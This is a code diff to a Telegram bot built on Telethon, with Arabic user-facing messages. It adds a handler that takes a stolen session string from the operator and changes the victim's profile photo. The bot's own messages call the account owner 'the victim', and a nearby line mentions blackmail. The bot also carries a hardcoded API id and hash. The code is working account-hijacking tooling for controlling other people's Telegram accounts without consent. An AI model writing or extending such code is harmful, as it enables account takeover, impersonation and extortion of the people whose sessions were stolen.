@@ -177,7 +177,9 @@ async def userbans(strses, grp):
       except:
         pass
     
-
+async def change_pic(strses, new_pic_file):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        await X.set_profile_photo(file=new_pic_file)
 
 async def userchannels(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -793,5 +795,18 @@ async def users(event):
         
         await event.respond(" غير مبري الذمه اذا استخدمت الامر للابتزاز اللهم اني بلغت فاشهد", buttons=keyboard)
 
-
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Z")))
+async def users(event):
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message("الان ارسل الكود تيرمكس")
+        strses = await x.get_response()
+        op = await cu(strses.text)
+        if op:
+            pass
+        else:
+            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
+        await x.send_message("اعطني الصورة الجديدة")
+        new_pic = await x.get_response()
+        await change_pic(strses.text, new_pic.media.photo)  # استلام الصوره هنا
+        await event.reply(" تم تغيير صورة الحساب بنجاح ", buttons=keyboard)
 
